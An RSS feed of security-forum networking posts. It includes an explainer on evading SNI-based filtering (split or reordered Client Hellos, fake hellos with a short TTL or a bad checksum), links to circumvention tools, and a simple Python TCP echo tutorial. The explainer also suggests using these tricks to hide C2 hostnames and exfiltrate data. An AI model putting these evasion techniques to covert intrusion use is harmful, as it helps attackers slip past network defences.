<?xml version="1.0" encoding="UTF-8" ?>
<rss version="2.0" xmlns:discourse="http://www.discourse.org/" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:dc="http://purl.org/dc/elements/1.1/">
  <channel>
    <title>Networking - 0x00sec - The Home of the Hacker</title>
    <link>https://0x00sec.org/c/networking/63</link>
    <description>Topics in the &#39;Networking&#39; category </description>
    
      <lastBuildDate>Mon, 16 Oct 2023 07:18:45 +0000</lastBuildDate>
      <atom:link href="https://0x00sec.org/c/networking/63.rss" rel="self" type="application/rss+xml" />
        <item>
          <title>Has anyone here run Suricata-IDS in AF_PACKET IPS mode?</title>
          <dc:creator><![CDATA[Hack3rcon]]></dc:creator>
          <category>Networking</category>
          <description><![CDATA[
            <p>Hello,<br>
I want to launch the Suricata-IDS in <code>AF_PACKET IPS</code> mode. Does anyone have experience with this?</p>
<p>Thank you.</p>
            <p><small>5 posts - 4 participants</small></p>
            <p><a href="https://0x00sec.org/t/has-anyone-here-run-suricata-ids-in-af-packet-ips-mode/37406">Read full topic</a></p>
          ]]></description>
          <link>https://0x00sec.org/t/has-anyone-here-run-suricata-ids-in-af-packet-ips-mode/37406</link>
          <pubDate>Mon, 16 Oct 2023 07:18:45 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>Yes</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">0x00sec.org-topic-37406</guid>
          <source url="https://0x00sec.org/t/has-anyone-here-run-suricata-ids-in-af-packet-ips-mode/37406.rss">Has anyone here run Suricata-IDS in AF_PACKET IPS mode?</source>
        </item>
        <item>
          <title>How to redirect requests?</title>
          <dc:creator><![CDATA[Hack3rcon]]></dc:creator>
          <category>Networking</category>
          <description><![CDATA[
            <p>Hello,<br>
Consider a program that communicates with a database server. The IP address is fixed in the program code (hard coding) and there is no access to the program source code. The IP address of the database server must be changed. What solution do you suggest for the application to communicate with the database server with the new IP address?</p>
<p>Thank you.</p>
            <p><small>4 posts - 4 participants</small></p>
            <p><a href="https://0x00sec.org/t/how-to-redirect-requests/36772">Read full topic</a></p>
          ]]></description>
          <link>https://0x00sec.org/t/how-to-redirect-requests/36772</link>
          <pubDate>Sun, 03 Sep 2023 18:05:50 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>Yes</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">0x00sec.org-topic-36772</guid>
          <source url="https://0x00sec.org/t/how-to-redirect-requests/36772.rss">How to redirect requests?</source>
        </item>
        <item>
          <title>How to discover open ports?</title>
          <dc:creator><![CDATA[Hack3rcon]]></dc:creator>
          <category>Networking</category>
          <description><![CDATA[
            <p>Hello,<br>
In a local network, a device like the FortiGate existed and clients connecting to it for use the Internet. The traceroute output is:</p>
<pre><code class="lang-auto">$ sudo traceroute -4 google.com -I
traceroute to google.com (216.239.38.120), 30 hops max, 60 byte packets
1  192.168.1.1 (192.168.1.1)  3.090 ms  3.412 ms  3.720 ms
2  two.two.two.two (2.0.0.2)  0.692 ms  0.796 ms  0.904 ms
3  192.168.1.200 (192.168.1.200)  0.202 ms  0.181 ms  0.169 ms
...
16  any-in-2678.1e100.net (216.239.38.120)  33.692 ms  33.689 ms  33.685 ms</code></pre>
<p>I scanned 192.168.1.200 IP address with the Nmap, but it couldn’t detect any open ports. How can I find the port that packets pass through it?</p>
<p>Thank you.</p>
            <p><small>15 posts - 7 participants</small></p>
            <p><a href="https://0x00sec.org/t/how-to-discover-open-ports/32998">Read full topic</a></p>
          ]]></description>
          <link>https://0x00sec.org/t/how-to-discover-open-ports/32998</link>
          <pubDate>Tue, 17 Jan 2023 08:24:26 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>Yes</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">0x00sec.org-topic-32998</guid>
          <source url="https://0x00sec.org/t/how-to-discover-open-ports/32998.rss">How to discover open ports?</source>
        </item>
        <item>
          <title>Bypassing SNI filtering : Feat DPITunnel, Zapret and Geneva</title>
          <dc:creator><![CDATA[messede]]></dc:creator>
          <category>Networking</category>
          <description><![CDATA[
            <p>Hey Everyone, i was recently  browsing a anti-censorship <a href="https://0x00sec.org">awesome list</a> and i came across few tools with some really cool tricks to bypass SNI based filtering mechanisms, i think these tools deserves more attention and are really worth sharing so here we are.</p>
<h2>Understanding SNI</h2>
<p>Before we dive into how these tools actually works lets understand what SNI is, SNI stands for Server Name Indication its a part of the TLS protocol (a header to be exact) which lets the webserver decide which TLS certificate has to be offered to a client when it is hosting multiple websites.
            Lets fire up wireshark and take a quick look at this SNI header, we will
use the filter <code>ssl.handshake.extension.type == "server_name"</code> to make our lives easier and try connecting to 0x00sec.org, now wireshark should hide everything except the Client Hello packets which are sent during the TLS handshake, lets take a look...</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/3X/2/5/25119fede2c5afa2e49fd1bdfa528553b982e681.png" data-download-href="/uploads/short-url/5hVquanLlgcZyNm74sHHP7BKoVj.png?dl=1" title="TLS-Client-Hello" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/optimized/3X/2/5/25119fede2c5afa2e49fd1bdfa528553b982e681_2_601x500.png" alt="TLS-Client-Hello" data-base62-sha1="5hVquanLlgcZyNm74sHHP7BKoVj" width="601" height="500" srcset="https://0x00sec.s3.amazonaws.com/optimized/3X/2/5/25119fede2c5afa2e49fd1bdfa528553b982e681_2_601x500.png, https://0x00sec.s3.amazonaws.com/original/3X/2/5/25119fede2c5afa2e49fd1bdfa528553b982e681.png 1.5x, https://0x00sec.s3.amazonaws.com/original/3X/2/5/25119fede2c5afa2e49fd1bdfa528553b982e681.png 2x" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/3X/2/5/25119fede2c5afa2e49fd1bdfa528553b982e681_2_10x10.png"></a></div><p></p>
<p>expanding the server_name TLS extension reveals us the SNI header, now some of you must be wondering - isn't TLS supposed encrypt everything ?, actually no lets see why. Say we have a webserver hosting a few sites (on the same ip) via plain HTTP, when a user requests a site the webserver just looks at the HTTP Host header field in the clients HTTP request serves up the appropriate site, everything works fine.</p>
<pre><code>========================
GET /index.html HTTP/<span>1.1</span>    _
<span>Host:</span> ctf<span>.0</span>x00sec<span>.org</span>        \              ======================
                              \             WEBSERVER (<span>133.7</span><span>.133</span><span>.7</span>)
                                ---------&gt;    --server.conf--
========================      / &lt;---------      ctf<span>.0</span>x00sec<span>.org</span> -&gt;  /var/www/html/ctf
GET /index.html HTTP/<span>1.1</span>    _/                  <span>0x00</span><span>sec</span><span>.org</span>     -&gt;  /var/www/html/forum
<span>Host:</span> <span>0x00</span><span>sec</span><span>.org</span>
</code></pre><p>Now lets add TLS to the mix, to establish a TLS connection we first need the TLS certificates which are unique to each site<sup>1</sup>, and to get the appropriate TLS certs we need to tell the server which site we are trying to connect to, this is where SNI comes in, it "indicates" what "server name" we are trying to connect to so that the server can give us the appropriate certificates, well now why is the SNI field unencrypted ?, thats simply because we havent established a secure connection yet and SNI is required to establish that secure connection in the first place! ( its somewhat like the chicken and egg problem). During the time in which SNI was introduced(around 2003), TLS simply did not want to deal with the overhead of coming up with a way to hide the SNI field and decided to let it be (in other words it was acceptable, a hostname was not really that confidential), the same TLS standard continue to be widely followed/used today.</p>
<h2>The Impact Of Unencrypted SNIs</h2>
<p>Blocking sites/services has been a favourite past time of many ISPs and governments around the world, in the early days everything was plaintext and intercepting proxies did the job, as networks grew in size and ssl started gaining popularity it became unrealistic to inspect traffic with proxies, everybody switched over to filtering DNS requests although this worked quite well for some time, with the advent of technologies like DoH(DNS over Https) and DoT(DNS over TLS) DNS filtering too became a thing of the past, when all hope seemed lost firewall vendors turned to that one part of TLS that remained unencrypted... SNI!!.</p>
<h2>How SNI Inspection Works</h2>
<p>Lets say we want to connect to 0x00sec.org from our pc, the TCP connection would look like this:</p>
<pre><code>                                           [+------+------+]
OUR-PC [<span>123.123</span><span>.1</span><span>.3</span> : <span>62123</span> ] =============[F-I-R-E-W-A-L-L]============&gt; [<span>443</span>  : <span>133.7</span><span>.133</span><span>.7</span>] 0x00sec.org
          Our <span>Ip</span>      Random               [+------+------+]              HTTPS    Servers <span>Ip</span>
                    Source Port                                       Standard Port
</code></pre><p>The blocking process is fairly straight forward, every time a TLS client hello is sent, the firewall just extracts the SNI field(the hostname) from the packet and compares it against a blocklist, when a match is found the hello packet can simply be dropped preventing the client from establishing the TLS connection. Dropping TLS client hello's as i mentioned before is only practical in smaller networks with limited traffic (i.e in cases of colleges, corporate networks), in case of ISPs inspecting and dropping packets on the gateway would be very costly and impractical due the heavy load ISPs generally are under, thus ISPs usually mirror the traffic<sup>2</sup> into a inspection device, the inspecting device matches the extracted SNI field against a blocklist as well, but to block the traffic it forges a TCP reset packet with the ip and port of the server (in our case 133.7.133.7 and 443 ) and sends it to client (i.e 123.123.1.3 on port 62123), fooling the client into thinking that the server has terminated the TCP connection thus effectively preventing the client from further communicating with the server, this method might not be 100% accurate since the reset packet can get lost during transmission, but that is within a acceptable margin, this method is what makes censorship possible at the level of ISPs.</p>
<h2>Bypassing SNI Inspection - A Review of Techniques Used For Circumvention</h2>
<p>Before we begin lets consider a simple representation of a TLS client hello packet for the sake of conversation.</p>
<pre><code>  +---------------------------+-----------------------------+
  | <span>SRC</span> IP: <span>123.123</span><span>.1</span><span>.3</span>       |     <span>DST</span> ISP: <span>133.7</span><span>.133</span><span>.7</span>    |     <span>// IP</span>
  +---------------------------+-----------------------------+
  | <span>SRC</span> PORT: <span>45637</span>           |     <span>DST</span> PORT: <span>443</span>           |     <span>// TCP</span>
  +---------------------------+-----------------------------+
  | <span>TLS</span> Ver |<span>..TLS</span>.Stuff....  | <span>SNI</span>:Server-Name: <span>0x00</span>sec.org|     <span>// TLS</span>  Client Hello  
  +---------------------------+-----------------------------+
</code></pre><p>  <b>1) Split the Client hello at SNI field :</b> As i have mentioned before the filtering process is interested in the Server Name indicated by the SNI, this process expects the entire TLS Client Hello to be present in a single packet<sup>3</sup>, to evade this filtering process we segment the TLS data in half such that SNI server name is not completely in one portion, we then transmit those portions as separate TCP segments. </p>
<pre><code>  SEGMENT <span>1</span>: 
  +---------------------------+-----------------------------+
  | SRC IP: <span>123.123</span><span>.1</span><span>.3</span>       |     DST ISP: <span>133.7</span><span>.133</span><span>.7</span>    |     <span>// IP</span>
  +---------------------------+-----------------------------+
  | SRC PORT: <span>45637</span>           |     DST PORT: <span>443</span>           |     <span>// TCP</span>
  +---------------------------+-----------------------------+
  | TLS Ver |..TLS.Stuff....  |   SNI:Server-Name: <span>0x00</span>     |     <span>// Partial TLS Client Hello  </span>
  +---------------------------+-----------------------------+
</code>
<code>
  SEGMENT <span>2</span>: 
  +---------------------------+-----------------------------+
  | SRC IP: <span>123.123</span><span>.1</span><span>.3</span>       |     DST ISP: <span>133.7</span><span>.133</span><span>.7</span>    |     <span>// IP</span>
  +---------------------------+-----------------------------+
  | SRC PORT: <span>45637</span>           |     DST PORT: <span>443</span>           |     <span>// TCP</span>
  +---------------------------+-----------------------------+
  | sec.org................................................ |     <span>// Partial TLS Client Hello  </span>
  +---------------------------+-----------------------------+
</code></pre><p>  when the first TCP segment is seen by the filter, it would immediate recognize it as TLS Client hello since the first portion has the appropriate TLS application header, but when it extracts the SNI servername it only gets the partial hostname (ex: 0x00 instead of 0x00sec.org), since the partial hostname doesnt match against any of the blocklists the packet is let through, as far as the second segment is concerned it has no meaningfull application header and hence is not processed by the filter and let through.</p>
<p> <b> 2) Split and send the client hello in random order :</b> This is variation of the first method except we send the segments in reverse or random order<sup>4</sup>, this is done in order to bypass certain filters which can reassemble segments but expects the segments to be sent in the right order.</p>
<p>  <b>3) Use TCP window size to fragment the server hello :</b> Most filtering processes only analyze outbound packets (i.e packets originating from clients, TLS client hello in our case), but there are a few which analyze inbound packets as well, in such a case if the server hello is analyzed, it would contain a "certificate common name" (which again is nothing but hostname for which the TLS certificate was issued), which might match against the blocklist. In this situation we need to achive something similar to the first technique but from the servers end, we thus advertise a small TCP Window size which would force the server to split the server hello across multiple TCP segments hence achieving evasion.</p>
<p>  <b>4) Send Fake client hello with an allowed SNI, but with a TTL not long enough to reach server :</b> In some scenarios, once a TLS client hello has been analyzed by the filter and allowed to pass, that particular TCP stream is ignored, any further inbound or outbound packets from that stream will not be analyzed, this is done inorder to reduce the amount of processing that a filter has to perform since a TLS client hello is sent only once per TLS session. We now can send a TLS client hello with a fake SNI-Server Name of a random allowed site (say wikipedia.org) but with a TTL(time to live) value just enough to reach the filter but not the actual server, thus effectively preventing our TCP stream from being further analyzed, now we can send the actual TLS client hello and go on with our business.</p>
<pre><code>        ____________                      ____\ /____                      __^____^__
      <span>&lt;[Your Machine]&gt;</span>                   |<span>Your Router</span>|<span>                    [</span>|<span>Firewall</span>|<span>]          
  +-----------------------+        +-----------------------+        +-----------------------+
  </span>|<span> DST: 133.7.133.7      </span>|<span>        </span>|<span> DST: 133.7.133.7      </span>|<span>        </span>|<span> DST: 133.7.133.7      </span>|
  |<span> SNI: wiki.org </span>|<span> TTL: 3</span>|<span>  ====&gt; </span>|<span> SNI: wiki.org </span>|<span> TTL: 2</span>|<span>  ====&gt; </span>|<span> SNI: wiki.org </span>|<span> TTL: 1</span>|<span> ===&gt;</span>|
  +-----------------------+        +-----------------------+        +-----------------------+    ||
                                                                                                 ||
  |<span>&lt;=============================================================================================&lt;</span>|
  ||<span>   
  </span>||<span>    [[Some interm Router]]               [[ The Webserver - 0x00sec.org @ 133.7.133.7]]
  </span>||<span>  +-----------------------+             
  </span>||<span>  </span>|<span> DST: 133.7.133.7      </span>|<span>   \/                  &lt; packet doesnt arrive &gt;
  </span>|<span>==&gt;</span>|<span> SNI: wiki.org </span>|<span> TTL: 0</span>|<span>   /\
      +-----------------------+
<pre><code>      TTL Becomes Zero Packet 
            is dropped
</code></pre>
</span></code><p><code></code></p></pre> <b> 5) Corrupting the checksum :</b> This is variation of the 4th technique, but here instead of using TTL to prevent the fake TLS client hello from reaching the server, we allow the client hello to reach the server, but we corrupt its checksum value, filters usually dont validate the checksum of packets to avoid overhead, but the client and server are fully compliant TCP implementations and will drop any packets with bad checksums, we can then send the real client hello and go on with our business. (This method has few caveats check note 5)<p></p><p></p>
<pre><code>        ____________                      __^____^__                      
      <span>&lt;[Your Machine]&gt;</span>                   [|<span>Firewall</span>|<span>]              [[ Webserver - 0x00sec.org]] 
  +-----------------------+        +-----------------------+        +-----------------------+
  </span>|<span> DST: 133.7.133.7      </span>|<span>        </span>|<span> DST: 133.7.133.7      </span>|<span>        </span>|<span> DST: 133.7.133.7      </span>|
  |<span> SNI: wiki.us</span>|<span> BADCHKSM</span>|<span>  ====&gt; </span>|<span> SNI: wiki.us</span>|<span> BADCHKSM</span>|<span>  ====&gt; </span>|<span> SNI: wiki.us</span>|<span> BADCHKSM</span>|
  +-----------------------+        +-----------------------+        +-----------------------+

                                   . wiki.us is not blocked          \/   Packet has bad         
                                     allow packet to pass            /\   checksum drop it

                                   . Further packets from the
                                     TCP stream is no longer
                                     processed
</code></pre><p>These are the most common techniques used by circumvention tools, but there are many others, one of tools Geneva
</p><p>goes the extra mile by developing tailored bypass mechanisms depending on the censor, Geneva is really cool project and you can read more about it <a href="https://geneva.cs.umd.edu/" rel="noopener nofollow ugc">here</a></p><p></p>
<h2>Attempts To Solve The Unencrypted SNI Problem</h2>
<ul>
<li>ESNI/ECH (Encrypted SNI/ Encrypted Client Hello): There are RFC drafts discussing these possibilities but there are also legitmate concerns regarding their implementation, ESNI/ECH would completely blind firewall and other filtering devices in educational institutions, SNI also serves as a possible IOC for SEIMs, but it is possible to block ESNI/ECH and force the client to fall back to regular methods, The Great Firewall has been observed doing this <a href="https://geneva.cs.umd.edu/posts/china-censors-esni/esni/" rel="noopener nofollow ugc">since mid 2020</a> </li>
</ul>
<h2>Alternative Use Cases Of These Tools</h2>
<ul>
<li>In pentest, red teaming scenarios : <ul>
<li>Can enable access to blocked services (ex: telegram), which can be used for exfiltration</li>
<li>Provide better opsec for your beacon/agent by hiding the C2 hostnames from the firewall</li>
</ul>
</li>
</ul>
<h2>Scenarios In Which These Tools Likely Will Not Help</h2>
<ul>
<li>The fragmentation attack performed by these tools will not work against proxies which perform SNI filtering (ex: Squid), since proxies generally reassemble TCP fragments before inspection.</li>
<li>In cases of ip filtering (ex: blackholeing 133.7.133.7)</li>
<li>In cases where UDP is being filtered out (DPITunnel only works for TCP traffic)</li>
</ul>
<h2>Notes</h2>
<ol>
<li>
<p>There are exception to certificates being unique to a site, in case of subdomains, a single wild card certificate (ex: certificate for *.0x00sec.org) can be utilized by all the subdomains of a site.</p>
</li>
<li>
<p>Port Mirroring or a similar feature is usually available in switches and other routing devices where a (physical) port can be configured for monitoring purposes, a copy of all packets flowing through the device is sent to this port, a machine can be connected to this monitoring port with its network interface in promiscous mode, all passing traffic can now be inspected by listening on this interface without any processing overhead on the gateway.</p>
</li>
<li>
<p>Most filtering implementation expect the entire client hello to be part of a single TCP packet, because that generally is the case, though it is possible to segment the client hello across multiple TCP packets, in such a scenario the filtering process would be required to reassemble the tcp segments before analyzing them, this is computationally costly and thus not implemented in mainstream filtering products, one exception in this case is "The Great Firewall" which is said to have reassembly capability.</p>
</li>
<li>
<p>Out of order delivery is feature of TCP, the reciever buffers segments recieved in random order untill all segments of a sequence arrive, it then reassembles and delivers them to the application layer.</p>
</li>
<li>
<p>Many home routers may drop packets with bad checksum, the kernel paramter net.netfilter.nf_conntrack_checksum
can be set to 0 to prevent this.</p>
</li>
</ol>
<h2>Tools :</h2>
<ol>
<li>
<p><a href="https://github.com/Kkevsterrr/geneva/" rel="noopener nofollow ugc">https://github.com/Kkevsterrr/geneva/</a> (Linux) (recommended) </p>
</li>
<li>
<p><a href="https://github.com/zhenyolka/DPITunnel-cli" rel="noopener nofollow ugc">https://github.com/zhenyolka/DPITunnel-cli</a> (Linux) (recommended, personal choice)</p>
</li>
<li>
<p><a href="https://github.com/bol-van/zapret" rel="noopener nofollow ugc">https://github.com/bol-van/zapret</a> (Linux,BSD) (recommended)</p>
</li>
<li>
<p><a href="https://github.com/ValdikSS/GoodbyeDPI" rel="noopener nofollow ugc">https://github.com/ValdikSS/GoodbyeDPI</a> (Linux)</p>
</li>
<li>
<p><a href="https://github.com/SadeghHayeri/GreenTunnel" rel="noopener nofollow ugc">https://github.com/SadeghHayeri/GreenTunnel</a> (windows)</p>
</li>
<li>
<p><a href="https://github.com/macronut/ghostcp" rel="noopener nofollow ugc">https://github.com/macronut/ghostcp</a> (windows)</p>
</li>
<li>
<p><a href="https://github.com/zhenyolka/DPITunnel-android" rel="noopener nofollow ugc">https://github.com/zhenyolka/DPITunnel-android</a> (android)</p>
</li>
</ol>
<h2>References :</h2>
<ol>
<li>
<p><a href="https://github.com/bol-van/zapret/blob/master/docs/readme.eng.md" rel="noopener nofollow ugc">https://github.com/bol-van/zapret/blob/master/docs/readme.eng.md</a></p>
</li>
<li>
<p><a href="https://geneva.cs.umd.edu/papers/geneva_ccs19.pdf" rel="noopener nofollow ugc">https://geneva.cs.umd.edu/papers/geneva_ccs19.pdf</a> </p>
</li>
<li>
<p><a href="https://hal.inria.fr/hal-01202712/document" rel="noopener nofollow ugc">https://hal.inria.fr/hal-01202712/document</a></p>
</li>
<li>
<p><a href="https://blog.torproject.org/learning-more-about-gfws-active-probing-system" rel="noopener nofollow ugc">https://blog.torproject.org/learning-more-about-gfws-active-probing-system</a></p>
</li>
<li>
<p><a href="https://habr.com/ru/post/335436/" rel="noopener nofollow ugc">https://habr.com/ru/post/335436/</a></p>
</li>
</ol>
<h2>Further Reading :</h2>
<ol>
<li>
<p><a href="https://geneva.cs.umd.edu/posts/india-sni-filtering/" rel="noopener nofollow ugc">https://geneva.cs.umd.edu/posts/india-sni-filtering/</a></p>
</li>
<li>
<p><a href="https://geneva.cs.umd.edu/posts/iran-whitelister/" rel="noopener nofollow ugc">https://geneva.cs.umd.edu/posts/iran-whitelister/</a></p>
</li>
<li>
<p><a href="https://geneva.cs.umd.edu/posts/china-censors-esni/esni/" rel="noopener nofollow ugc">https://geneva.cs.umd.edu/posts/china-censors-esni/esni/</a></p>
</li>
<li>
<p><a href="https://citizenlab.ca/2018/04/planet-netsweeper/" rel="noopener nofollow ugc">https://citizenlab.ca/2018/04/planet-netsweeper/</a></p>
</li>
<li>
<p><a href="https://www.youtube.com/watch?v=zcC5K7QTdvM" rel="noopener nofollow ugc">How the Great Firewall Discovers Hidden Circumvention Servers</a></p>
</li>
<li>
<p><a href="https://geneva.cs.umd.edu/posts/" rel="noopener nofollow ugc">https://geneva.cs.umd.edu/posts/</a></p>
</li>
</ol>
            <p><small>9 posts - 3 participants</small></p>
            <p><a href="https://0x00sec.org/t/bypassing-sni-filtering-feat-dpitunnel-zapret-and-geneva/31001">Read full topic</a></p>
          ]]></description>
          <link>https://0x00sec.org/t/bypassing-sni-filtering-feat-dpitunnel-zapret-and-geneva/31001</link>
          <pubDate>Fri, 02 Sep 2022 06:42:35 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>No</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">0x00sec.org-topic-31001</guid>
          <source url="https://0x00sec.org/t/bypassing-sni-filtering-feat-dpitunnel-zapret-and-geneva/31001.rss">Bypassing SNI filtering : Feat DPITunnel, Zapret and Geneva</source>
        </item>
        <item>
          <title>TCP server and TCP client in Python</title>
          <dc:creator><![CDATA[curi_00]]></dc:creator>
          <category>Networking</category>
          <description><![CDATA[
            <h2>
<a name="transmission-control-protocol-1" class="anchor" href="https://0x00sec.org#transmission-control-protocol-1"></a>Transmission Control Protocol</h2>
<p>TCP stands for Transmission Control Protocol. TCP is a communication standard that enables application programs and computing devices to exchange messages over a network. TCP establishes a connection between the source and destination before it starts transmitting the data. It breaks large amounts of data into smaller packets while ensuring data integrity.</p>
<h2>
<a name="tcp-server-in-python-2" class="anchor" href="https://0x00sec.org#tcp-server-in-python-2"></a>TCP server in python</h2>
<p>We import <code>socket</code> and <code>threading</code> module. The <code>socket</code> module provides various objects, constants , functions and related exceptions for building full-fledged network applications including client and server programs. The <code>threading</code> module allows a program to run multiple operations concurrently in the same process space thus making the program faster.</p>
<pre><code class="lang-python">import socket
import threading
</code></pre>
<p>We create a socket object with the the <code>AF_INET</code> and <code>SOCK_STREAM</code> parameters. <code>AF_INET</code> specifies the address family that our socket will use and in this case, it is Internet Protocol Version 4 address. <code>SOCK_STREAM</code> shows that the socket object will use TCP.</p>
<pre><code class="lang-python">#create TCP/IP socket
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
</code></pre>
<p>We define the <code>IP</code> and the port number for the server and we pass these arguments to the socket. This tells the socket object to listen on this <code>IP</code> address and port number.</p>
<pre><code class="lang-python">server_ip = "0.0.0.0"
server_port = 9999

#Bind socket to port
sock.bind((server_ip,server_port))
</code></pre>
<p>This sets the number of maximum connections that can be connected to the server.in this case, the the server can only have a maximum of 5 connections.</p>
<pre><code class="lang-python">#Listen for incomming connections
sock.listen(5)
</code></pre>
<p>Once a client has established a connection to the server, we keep the client’s socket in the <code>connection</code> variable and the connection details in the <code>client_addr</code> variable. <code>client_addr[0]</code> stores the IP address of the client and <code>client_addr[1]</code> stores the port that the client used to establish a connection to the server.</p>
<p>For each client connection, we spin up a thread object that calls the <code>handle_client</code> function and we pass in the <code>connection</code> variable as the argument to the function.</p>
<pre><code class="lang-python">while True:
    #wait for connection
    connection,client_addr = sock.accept()
    print("[*] Accepted connection from: %s:%d" %(client_addr[0],client_addr[1]))

    client_handler =  threading.Thread(target=handle_client, args=(connection,))
    client_handler.start()
</code></pre>
<p>The <code>handle_client</code> function receives what the client socket sent and it sends back an <code>ACK!</code> message to the client to acknowledge that the message was received.</p>
<p>Then it closes the connection.</p>
<pre><code class="lang-python">def handle_client(client_socket):

    request = client_socket.recv(1024)

    print("[*] Recieved: %s" %request)

    #send acknowldgement
    data = "ACK!".encode('utf-8')
    client_socket.send(data)

    client_socket.close()
</code></pre>
<p>Here is the full code for the <code>tcp</code> server in python.</p>
<pre><code class="lang-python">import socket
import threading

#create TCP/IP socket
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

server_ip = "0.0.0.0"
server_port = 9999

#Bind socket to port
sock.bind((server_ip,server_port))

#Listen for incomming connections
sock.listen(5)

print ("[*] Listening on %s:%d" %(server_ip,server_port))

def handle_client(client_socket):

    request = client_socket.recv(1024)

    print("[*] Recieved: %s" %request)

    #send acknowldgement
    data = "ACK!".encode('utf-8')
    client_socket.send(data)

    client_socket.close()
while True:
    #wait for connection
    connection,client_addr = sock.accept()
    print("[*] Accepted connection from: %s:%d" %(client_addr[0],client_addr[1]))

    client_handler =  threading.Thread(target=handle_client, args=(connection,))
    client_handler.start()

</code></pre>
<p>Let’s run the server.</p>
<pre><code class="lang-bash">python3 tcp_server.py 
[*] Listening on 0.0.0.0:9999
</code></pre>
<p>The server is listening on <code>0.0.0.0:9999</code> and is ready for any incoming connections.</p>
<p>#<span class="hashtag">#TCP</span> client in python</p>
<p>Creating a <code>tcp</code> client is the same as creating the <code>tcp</code> server with only a few changes. Here the client connects to the server running on <code>0.0.0.0:9999</code> and sends a <code>Hello World!</code> message. Then, it prints the response it receives from the server.</p>
<pre><code class="lang-python">import socket

target_ip = "0.0.0.0"
target_port = 9999

#create a socket object
client = socket.socket(socket.AF_INET,socket.SOCK_STREAM)

#connect the client
client.connect((target_ip,target_port))

#send data
data = "Hello World!".encode('utf-8')
client.send(data)

#recieve data
response = client.recv(1024)

print(response)
</code></pre>
<p>Let’s run the client in another shell.</p>
<pre><code class="lang-bash">python3 tcp_client.py 
b'ACK!'
</code></pre>
<p>Let’s go back to the server and this is now the output of the server.</p>
<pre><code class="lang-bash">python3 tcp_server.py 
[*] Listening on 0.0.0.0:9999
[*] Accepted connection from: 127.0.0.1:55760
[*] Recieved: b'Hello World!'

</code></pre>
<p>If you stop the server and run it again, you will get an error about the <code>address already being in use</code>. To fix this run <code>pkill -9 python3</code> and then you should now be able to run the server again.</p>
<p>We have successfully built a <code>tcp</code> server and a <code>tcp</code> client in python.</p>
            <p><small>7 posts - 5 participants</small></p>
            <p><a href="https://0x00sec.org/t/tcp-server-and-tcp-client-in-python/29042">Read full topic</a></p>
          ]]></description>
          <link>https://0x00sec.org/t/tcp-server-and-tcp-client-in-python/29042</link>
          <pubDate>Sat, 16 Apr 2022 20:33:48 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>Yes</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">0x00sec.org-topic-29042</guid>
          <source url="https://0x00sec.org/t/tcp-server-and-tcp-client-in-python/29042.rss">TCP server and TCP client in Python</source>
        </item>
        <item>
          <title>Scanning WAN&#39;s and Stalking strange devices</title>
          <dc:creator><![CDATA[messede]]></dc:creator>
          <category>Networking</category>
          <description><![CDATA[
            <h2>
<a name="backdrop-1" class="anchor" href="https://0x00sec.org#backdrop-1"></a>BackDrop</h2>
<p>Last month while haphazardly scrolling through a networking book i came across something known as  the <a href="https://en.wikipedia.org/wiki/IPv4_shared_address_space">shared address space </a> , shared addresses are something ISPs use to achieve <a href="https://en.wikipedia.org/wiki/Carrier-grade_NAT">CGNAT</a> (carrier grade NAT) which is just like  regular old NAT but on the ISPs router , ISPs do this so that they don’t have to assign each one you a public address (IPv4 address space is running out/ran out <img src="https://0x00sec.org/images/emoji/twitter/thinking.png?v=9" title=":thinking:" class="emoji" alt=":thinking:"> remember ?) . so CGNAT is basically ISPs  NATing a bunch of  customers into using a single public address in order to conserve the IPv4 address space.</p>
<h3>
<a name="the-shared-address-space-2" class="anchor" href="https://0x00sec.org#the-shared-address-space-2"></a>The shared address space</h3>
<p>According to <a href="https://datatracker.ietf.org/doc/rfc6598/?include_text=1">IANA</a>, 100.64.0.0/10 is reserved for CGNAT purposes.</p>
<blockquote>
<p>Note : some ISPs in their naivety may use private ranges for CGNAT puposes , which certainly will cause problems to customers who use the same address range for their LANs</p>
</blockquote>
<p>Lets compare regular  NAT and CGNAT setups .</p>
<ul>
<li>
<p><em><strong>Regular NAT</strong></em> : all devices in this setup use one public address (193.223.22.22) to communicate with the internet<br>
<img src="https://0x00sec.s3.amazonaws.com/original/3X/9/0/908cf3150c7ca5cfb742cd56634113f5bffb566e.png" alt="Regular NAT" data-base62-sha1="kCKJNIIDDZ0CFQfaqNe1MKVtVJY" width="615" height="251"></p>
</li>
<li>
<p><em><strong>CGNAT</strong></em> :  multiple customers of the ISP share the same public address (193.223.22.22) , in order to  conserve the IPv4 address space.<br>
